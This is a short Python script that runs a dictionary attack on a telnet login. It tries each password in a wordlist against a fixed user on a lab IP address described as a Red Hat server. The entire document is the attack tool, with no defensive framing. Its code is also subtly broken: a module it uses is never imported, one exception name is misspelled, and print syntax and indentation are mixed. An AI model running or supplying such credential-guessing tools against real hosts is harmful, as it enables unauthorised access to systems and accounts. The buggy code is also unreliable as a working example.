import sys
import telnetlib

wordlist = open("wordlist.txt","r")

host = "192.168.40.138" #put the ip of red hat server
user = "mango"

def attack_telnet(passwd):
   tn = telnetlib.Telnet(host)
   try:
      tn.read_until("login: ")
   except EOFError:
      print("error: read(login) failed")
      
   try:
      tn.write(user + "\n")
   except socket.errorr:
      print("error: write(username) failed")
	  
   if passwd:
      try:
         tn.read_until("Password:")
      except EOFError:
         print('error: read(password) failed')
		 
      try:
         tn.write(passwd + "\n")
      except socket.error:
	     print("error: write(password) failed")
         

      print "applied this password.."

      try:
         (i,obj,byt) = tn.expect([b'incorrect', b'@'], 2)
      except EOFError:
         print "Error occured"
      if i == 1:
         return True
      tn.close()
      return False

passwords = wordlist.readlines()
for pwd in passwords:
   passwd = pwd.strip()
   print "Testing ",passwd
   if(attack_telnet(passwd)):
      print "password is -> ",passwd
      break

wordlist.close()
